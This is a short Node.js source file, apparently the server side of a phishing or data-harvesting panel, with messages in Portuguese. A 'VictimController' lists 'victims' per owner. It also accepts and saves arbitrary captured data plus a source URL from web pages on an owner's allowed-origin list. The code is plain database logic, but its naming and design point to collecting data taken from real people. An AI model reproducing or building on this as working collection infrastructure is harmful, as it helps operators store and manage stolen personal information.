const Victim = require("../models/Victim");
const status = require("../../functions/status");
const User = require("../models/User");
const getHostname = require("../../functions/getHostname");
const { isDev } = require("../../../index");

module.exports = class VictimController {
    async GetAll(owner) {
        const victims = await Victim.find({
            owner,
        });

        try {
            if (victims.length > 0) {
                return {
                    status: 200,
                    victims,
                };
            } else {
                return {
                    status: 200,
                    victims: [],
                };
            }
        } catch {
            return status.server_error;
        }
    }

    async Create(owner, data, url) {
        const userData = await User.findOne({
            username: owner,
        });

        const allowedOrigins = userData.allowedOrigins || [];
        console.log(url);
        const hostname = getHostname(url);
        if (
            !allowedOrigins.find((o) => o.hostname == hostname) &&
            isDev == false
        ) {
            return {
                status: 403,
                error: "Esta origem não tem permissão para fazer isso.",
            };
        }

        const newVictim = new Victim({
            owner,
            data: data ? data : "",
            url,
        });

        try {
            const result = await newVictim.save();
            return {
                status: 200,
                message: "Dados salvos com êxito!",
                db: result,
            };
        } catch {
            return status.server_error;
        }
    }
};
